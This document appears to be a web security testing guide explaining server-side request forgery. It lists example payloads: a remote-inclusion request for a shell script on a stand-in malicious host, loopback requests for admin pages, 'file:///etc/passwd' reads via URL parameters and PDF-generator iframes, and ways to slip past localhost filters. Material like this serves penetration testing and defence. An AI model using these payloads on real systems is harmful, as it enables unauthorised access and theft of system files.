When testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious. The most common test is for local and remote file inclusion. There is also another facet to SSRF: a trust relationship that often arises where the application server is able to interact with other back-end systems that are not directly reachable by users. These back-end systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. These internal systems often contain sensitive data or functionality.

Consider the following request:

``` http
GET https://example.com/page?page=about.php
```

You can test this request with the following payloads.

# Load the Contents of a File

```http
GET https://example.com/page?page=https://malicioussite.com/shell.php
```

# Access a Restricted Page

```http
GET https://example.com/page?page=http://localhost/admin
```

Or:

```http
GET https://example.com/page?page=http://127.0.0.1/admin
```

Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host, you also have privileges to directly access the `admin` page.

These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what enables SSRF to be a critical vulnerability.

# Fetch a Local File

```http
GET https://example.com/page?page=file:///etc/passwd
```

# HTTP Methods Used

All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.

One important note on SSRF with POST requests is that the SSRF may also manifest in a blind manner, because the application may not return anything immediately. Instead, the injected data may be used in other functionality such as PDF reports, invoice or order handling, etc., which may be visible to employees or staff but not necessarily to the end user or tester.

You can find more on Blind SSRF [here](https://portswigger.net/web-security/ssrf/blind), or in the [references section](#references).

# PDF Generators

In some cases, a server may convert uploaded files to PDF format. Try injecting `<iframe>`, `<img>`, `<base>`, or `<script>` elements, or CSS `url()` functions pointing to internal services.

```html
<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">
```

# Common Filter Bypass

Some applications block references to `localhost` and `127.0.0.1`. This can be circumvented by:

- Using alternative IP representation that evaluate to `127.0.0.1`:
    - Decimal notation: `2130706433`
    - Octal notation: `017700000001`
    - IP shortening: `127.1`
- String obfuscation
- Registering your own domain that resolves to `127.0.0.1`

Sometimes the application allows input that matches a certain expression, like a domain. That can be circumvented if the URL schema parser is not properly implemented, resulting in attacks similar to [semantic attacks](https://tools.ietf.org/html/rfc3986#section-7.6).

- Using the `@` character to separate between the userinfo and the host: `https://expected-domain@attacker-domain`
- URL fragmentation with the `#` character: `https://attacker-domain#expected-domain`
- URL encoding
- Fuzzing
- Combinations of all of the above

For additional payloads and bypass techniques, see the [references](#references) section.

